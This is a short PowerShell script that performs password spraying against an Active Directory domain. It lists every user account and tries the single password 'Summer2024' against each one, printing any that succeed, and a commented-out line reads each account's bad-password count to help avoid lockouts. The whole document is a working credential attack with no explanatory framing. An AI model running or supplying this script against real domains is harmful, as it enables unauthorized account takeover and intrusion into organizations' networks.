$search = [adsisearcher]"(&(samAccountType=805306368))"
$search.PageSize = 10000
$users = $search.FindAll()
$userlist = $users | % { $_.properties['samaccountname']}
$password = "Summer2024"
$Domain = $env:userdnsdomain
$CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
$count = $UserList.count
Write-Host "[*] Now trying password $password against $count users."
foreach($user in $userlist){
    $checkdomain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$user,$password)
    if ($checkdomain.name -ne $null)
    {
        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
    }
}

# Check bad password attempt count:
# ([adsisearcher]"(&(ObjectCategory=Person)(ObjectClass=User))").FindAll() | % {write-host $_.Properties['name'] "--->" $_.Properties['badpwdcount'] }
